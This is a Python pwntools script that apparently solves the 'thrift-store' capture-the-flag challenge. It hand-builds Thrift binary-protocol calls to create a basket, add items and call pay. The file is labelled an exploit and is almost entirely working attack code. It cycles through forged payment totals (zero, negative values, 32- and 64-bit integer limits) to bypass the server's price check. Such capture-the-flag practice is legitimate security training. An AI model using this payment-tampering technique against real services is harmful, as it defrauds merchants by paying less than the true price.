#!/usr/bin/env python3
# -*- coding: utf-8 -*-

# pwntools-based Thrift client for the thrift-store challenge
# Crafts minimal TFramedTransport + TBinaryProtocol messages by hand
# to reach createBasket, addToBasket, and pay. Tries bypass totals
# like 0, -1, INT_MIN, INT_MAX, LONG_MIN, LONG_MAX.

from pwn import remote
import struct
import argparse
from typing import List, Optional, Tuple


# Thrift constants
T_CALL = 1
T_REPLY = 2
T_EXCEPTION = 3

T_STOP = 0
T_VOID = 1
T_BOOL = 2
T_BYTE = 3
T_DOUBLE = 4
T_I16 = 6
T_I32 = 8
T_I64 = 10
T_STRING = 11
T_STRUCT = 12
T_MAP = 13
T_SET = 14
T_LIST = 15


def i16(x: int) -> bytes:
    return struct.pack(">h", x)


def i32(x: int) -> bytes:
    return struct.pack(">i", x)


def i64(x: int) -> bytes:
    return struct.pack(">q", x)


def u32(x: int) -> bytes:
    return struct.pack(">I", x)


def tstring(s: str) -> bytes:
    b = s.encode("utf-8")
    return i32(len(b)) + b


def tfield_header(typ: int, fid: int) -> bytes:
    return struct.pack(">bh", typ, fid)


def frame(payload: bytes) -> bytes:
    return u32(len(payload)) + payload


def tmessage_strict(name: str, mtype: int, seqid: int, args_payload: bytes) -> bytes:
    version = 0x80010000 | (mtype & 0xFF)
    # pack as signed 32-bit
    if version >= (1 << 31):
        version -= (1 << 32)
    return i32(version) + tstring(name) + i32(seqid) + args_payload


def tmessage_loose(name: str, mtype: int, seqid: int, args_payload: bytes) -> bytes:
    # Non-strict: name string, mtype byte, seqid i32
    return tstring(name) + bytes([mtype & 0xFF]) + i32(seqid) + args_payload


def send_call(io: remote, name: str, args_payload: bytes, seqid: int = 1, strict: bool = True) -> None:
    if strict:
        payload = tmessage_strict(name, T_CALL, seqid, args_payload)
    else:
        payload = tmessage_loose(name, T_CALL, seqid, args_payload)
    io.send(frame(payload))


def recv_frame(io: remote) -> bytes:
    hdr = io.recvn(4)
    (ln,) = struct.unpack(">I", hdr)
    data = io.recvn(ln)
    # debug dump minimal when needed
    try:
        import binascii
        print(f"[dbg] frame len={ln} first32={binascii.hexlify(data[:32]).decode()}")
    except Exception:
        pass
    return data


def parse_reply_string_result(pkt: bytes) -> Tuple[Optional[str], Optional[str]]:
    """
    Parse a Thrift reply expecting a result struct that may contain a string
    success field (id=0). Returns (result_string, exception_message).
    """
    off = 0

    def read_i32() -> int:
        nonlocal off
        v = struct.unpack(">i", pkt[off : off + 4])[0]
        off += 4
        return v

    def read_i16() -> int:
        nonlocal off
        v = struct.unpack(">h", pkt[off : off + 2])[0]
        off += 2
        return v

    def read_byte() -> int:
        nonlocal off
        v = pkt[off]
        off += 1
        return v

    def read_string() -> str:
        nonlocal off
        ln = read_i32()
        s = pkt[off : off + ln]
        off += ln
        return s.decode("utf-8", errors="replace")

    # Handle both strict and loose message headers
    first = read_i32()
    if (first & 0xFFFF0000) == 0x80010000:
        # strict: first is version|type
        mtype = first & 0xFF
        name_len = read_i32()
        off += name_len  # skip method name
        _seqid = read_i32()
    else:
        # loose: first was name length
        name_len = first
        off += name_len
        # mtype is a single byte
        mtype = read_byte()
        _seqid = read_i32()

    if mtype == T_EXCEPTION:
        # TApplicationException: fields are typically (1: message string), (2: type i32)
        msg = None
        while True:
            t = read_byte()
            if t == T_STOP:
                break
            fid = read_i16()
            if t == T_STRING and fid == 1:
                msg = read_string()
            elif t == T_I32 and fid == 2:
                _ = read_i32()
            else:
                # best-effort skip
                if t == T_I16:
                    _ = read_i16()
                elif t == T_I32:
                    _ = read_i32()
                elif t == T_I64:
                    off += 8
                elif t == T_STRING:
                    _ = read_string()
                else:
                    # unknown; bail
                    break
        return None, msg or "TApplicationException"

    # Expect result struct
    result = None
    while True:
        t = read_byte()
        if t == T_STOP:
            break
        fid = read_i16()
        if fid == 0 and t == T_STRING:
            result = read_string()
        elif fid == 0 and t == T_STRUCT:
            # success is a struct; try to pull a string field inside (commonly fid=1)
            inner_result = None
            while True:
                tt = read_byte()
                if tt == T_STOP:
                    break
                _fid = read_i16()
                if tt == T_STRING and _fid in (0, 1):
                    inner_result = read_string()
                elif tt == T_I64:
                    off += 8
                elif tt == T_I32:
                    _ = read_i32()
                elif tt == T_I16:
                    _ = read_i16()
                elif tt == T_STRUCT:
                    # skip nested
                    while True:
                        ttt = read_byte()
                        if ttt == T_STOP:
                            break
                        __fid = read_i16()
                        if ttt == T_STRING:
                            _ = read_string()
                        elif ttt == T_I64:
                            off += 8
                        elif ttt == T_I32:
                            _ = read_i32()
                        elif ttt == T_I16:
                            _ = read_i16()
                        else:
                            break
                elif tt == T_STRING:
                    _ = read_string()
                else:
                    # skip unknown
                    break
            if inner_result is not None:
                result = inner_result
        else:
            # skip unknown field types conservatively
            if t == T_I16:
                _ = read_i16()
            elif t == T_I32:
                _ = read_i32()
            elif t == T_I64:
                off += 8
            elif t == T_STRING:
                _ = read_string()
            elif t == T_STRUCT:
                # skip nested struct fields until STOP
                while True:
                    tt = read_byte()
                    if tt == T_STOP:
                        break
                    _fid = read_i16()
                    if tt == T_STRING:
                        _ = read_string()
                    elif tt == T_I64:
                        off += 8
                    elif tt == T_I32:
                        _ = read_i32()
                    elif tt == T_I16:
                        _ = read_i16()
                    else:
                        break
            else:
                # unhandled; give up
                break

    return result, None


def call_get_inventory(io: remote, seqid: int = 1, strict: bool = True):
    """Return a list of dicts: [{slug, name, description, price}]"""
    args = bytes([T_STOP])
    send_call(io, "getInventory", args, seqid, strict)
    pkt = recv_frame(io)

    off = 0

    def read_i32() -> int:
        nonlocal off
        v = struct.unpack(">i", pkt[off : off + 4])[0]
        off += 4
        return v

    def read_i16() -> int:
        nonlocal off
        v = struct.unpack(">h", pkt[off : off + 2])[0]
        off += 2
        return v

    def read_byte() -> int:
        nonlocal off
        v = pkt[off]
        off += 1
        return v

    def read_string() -> str:
        nonlocal off
        ln = read_i32()
        s = pkt[off : off + ln]
        off += ln
        return s.decode("utf-8", errors="replace")

    def read_i64() -> int:
        nonlocal off
        v = struct.unpack(">q", pkt[off : off + 8])[0]
        off += 8
        return v

    first = read_i32()
    if (first & 0xFFFF0000) == 0x80010000:
        _mtype = first & 0xFF
        name_len = read_i32()
        off += name_len
        _seqid = read_i32()
    else:
        name_len = first
        off += name_len
        _mtype = read_byte()
        _seqid = read_i32()

    items = []
    while True:
        t = read_byte()
        if t == T_STOP:
            break
        fid = read_i16()
        if fid == 0 and t == T_LIST:
            _etype = read_byte()
            count = read_i32()
            for idx in range(count):
                elem = {"slug": None, "name": None, "description": None, "price": None}
                while True:
                    tt = read_byte()
                    if tt == T_STOP:
                        break
                    ff = read_i16()
                    # debug first item field map
                    if idx == 0:
                        print(f"[dbg] item0 field: type={tt} fid={ff}")
                    if tt == T_STRING and ff == 1:
                        elem["slug"] = read_string()
                    elif tt == T_STRING and ff == 2:
                        elem["name"] = read_string()
                    elif tt == T_STRING and ff == 3:
                        elem["description"] = read_string()
                    elif tt in (T_I64, T_I32):
                        val = read_i64() if tt == T_I64 else read_i32()
                        elem["price"] = val
                    elif tt == T_I32:
                        _ = read_i32()
                    elif tt == T_I64:
                        _ = read_i64()
                    elif tt == T_STRING:
                        _ = read_string()
                    else:
                        break
                items.append(elem)
        elif fid == 0 and t == T_STRUCT:
            # success wraps a struct containing the list (likely fid=1)
            while True:
                tt = read_byte()
                if tt == T_STOP:
                    break
                ff = read_i16()
                if tt == T_LIST and ff in (0, 1):
                    _etype = read_byte()
                    count = read_i32()
                    for idx in range(count):
                        elem = {"slug": None, "name": None, "description": None, "price": None}
                        while True:
                            ttt = read_byte()
                            if ttt == T_STOP:
                                break
                            fff = read_i16()
                            if idx == 0:
                                print(f"[dbg] item0 field: type={ttt} fid={fff}")
                            if ttt == T_STRING and fff == 1:
                                elem["slug"] = read_string()
                            elif ttt == T_STRING and fff == 2:
                                elem["name"] = read_string()
                            elif ttt == T_STRING and fff == 3:
                                elem["description"] = read_string()
                            elif ttt in (T_I64, T_I32):
                                val = read_i64() if ttt == T_I64 else read_i32()
                                elem["price"] = val
                            elif ttt == T_I32:
                                _ = read_i32()
                            elif ttt == T_I64:
                                _ = read_i64()
                            elif ttt == T_STRING:
                                _ = read_string()
                            else:
                                break
                        items.append(elem)
                else:
                    # skip nested unexpected fields
                    if tt == T_STRING:
                        _ = read_string()
                    elif tt == T_I32:
                        _ = read_i32()
                    elif tt == T_I64:
                        _ = read_i64()
                    elif tt == T_STRUCT:
                        # consume until stop
                        while True:
                            ttt = read_byte()
                            if ttt == T_STOP:
                                break
                            _ = read_i16()
                            if ttt == T_STRING:
                                _ = read_string()
                            elif ttt == T_I32:
                                _ = read_i32()
                            elif ttt == T_I64:
                                _ = read_i64()
                            else:
                                break
        else:
            # skip any unexpected field
            if t == T_STRUCT:
                while True:
                    tt = read_byte()
                    if tt == T_STOP:
                        break
                    _ = read_i16()
                    if tt == T_STRING:
                        _ = read_string()
                    elif tt == T_I32:
                        _ = read_i32()
                    elif tt == T_I64:
                        _ = read_i64()
                    else:
                        break
            elif t == T_STRING:
                _ = read_string()
            elif t == T_I32:
                _ = read_i32()
            elif t == T_I64:
                _ = read_i64()
            elif t == T_LIST:
                _ = read_byte(); _ = read_i32()
                break

    return items


def call_create_basket(io: remote, seqid: int = 1, strict: bool = True) -> Tuple[Optional[str], Optional[str]]:
    args = bytes([T_STOP])
    send_call(io, "createBasket", args, seqid, strict)
    pkt = recv_frame(io)
    return parse_reply_string_result(pkt)


def call_add_to_basket(io: remote, basket_id: str, slug: str, seqid: int = 1, strict: bool = True) -> Optional[str]:
    # args: (1: string basketId), (2: string itemSlug)
    args = (
        tfield_header(T_STRING, 1)
        + tstring(basket_id)
        + tfield_header(T_STRING, 2)
        + tstring(slug)
        + bytes([T_STOP])
    )
    send_call(io, "addToBasket", args, seqid, strict)
    pkt = recv_frame(io)
    # void return; still parse to check exceptions
    res, exc = parse_reply_string_result(pkt)
    return exc


def call_pay(io: remote, basket_id: str, total: int, seqid: int = 1, strict: bool = True) -> Tuple[Optional[str], Optional[str]]:
    # args: (1: string basketId), (2: i64 total)
    args = (
        tfield_header(T_STRING, 1)
        + tstring(basket_id)
        + tfield_header(T_I64, 2)
        + i64(total)
        + bytes([T_STOP])
    )
    send_call(io, "pay", args, seqid, strict)
    pkt = recv_frame(io)
    return parse_reply_string_result(pkt)


def run(host: str, port: int, items: List[str]) -> None:
    io = remote(host, port)

    # create basket
    # Try strict first; fallback to loose header if needed
    basket, exc = call_create_basket(io, 1, True)
    if basket is None and exc is None:
        # try reading failed; attempt loose
        try:
            io.close()
        except Exception:
            pass
        io = remote(host, port)
        basket, exc = call_create_basket(io, 1, False)
    if exc:
        print(f"createBasket exception: {exc}")
        return
    if not basket:
        print("createBasket returned no basket id")
        return
    print(f"Basket: {basket}")

    # Fetch inventory and show prices for relevant items (best-effort)
    try:
        inv = call_get_inventory(io, 2, True)
        if inv:
            print("Inventory (prices if available):")
            for it in inv:
                slug = it.get("slug")
                price = it.get("price")
                if slug:
                    if price is not None:
                        print(f"- {slug}: price={price}")
                    else:
                        pass
    except Exception:
        pass

    # Extra debug: dump printable strings from raw inventory frame
    try:
        args = bytes([T_STOP])
        send_call(io, "getInventory", args, 99, True)
        hdr = io.recvn(4)
        (ln,) = struct.unpack(">I", hdr)
        data = io.recvn(ln)
        # extract printable strings of length >= 4
        import re
        ss = re.findall(rb"[ -~]{4,}", data)
        print("[dbg] inventory strings:")
        for s in ss[:100]:
            try:
                print(s.decode())
            except Exception:
                print(repr(s))
    except Exception:
        pass

    # add chosen items (defaults to ones seen in the PCAP)
    for slug in items:
        exc = call_add_to_basket(io, basket, slug, 2, True)
        if exc:
            print(f"addToBasket({slug}) -> exception: {exc}")
        else:
            print(f"Added: {slug}")

    # Try exact computed total first (from inventory), then bypass candidates
    candidates = []
    try:
        inv = call_get_inventory(io, 4, True)
        price_map = {it.get("slug"): it.get("price") for it in inv if it.get("slug")}
        exact = sum(price_map.get(s, 0) or 0 for s in items)
        if exact > 0:
            candidates.append(exact)
            print(f"Computed exact total from inventory: {exact}")
    except Exception:
        pass
    candidates += [
        0,
        1,
        -1,
        (1 << 31) - 1,
        -(1 << 31),
        (1 << 32) - 1,
        (1 << 63) - 1,
        -(1 << 63),
    ]

    for t in candidates:
        res, exc = call_pay(io, basket, t, 3, True)
        if exc:
            print(f"pay(total={t}) -> exception: {exc}")
            continue
        if res:
            print(f"pay(total={t}) -> SUCCESS: {res}")
            break
        else:
            print(f"pay(total={t}) -> no response string")

    io.close()


def main():
    parser = argparse.ArgumentParser(description="pwntools Thrift exploit for thrift-store")
    parser.add_argument("host", nargs="?", default="thrift-store.chal.imaginaryctf.org")
    parser.add_argument("port", nargs="?", type=int, default=9090)
    parser.add_argument(
        "--items",
        nargs="*",
        default=["cheddar-cheese-200g", "tomatoes-500g"],
        help="Item slugs to add before paying",
    )
    args = parser.parse_args()
    run(args.host, args.port, args.items)


if __name__ == "__main__":
    main()
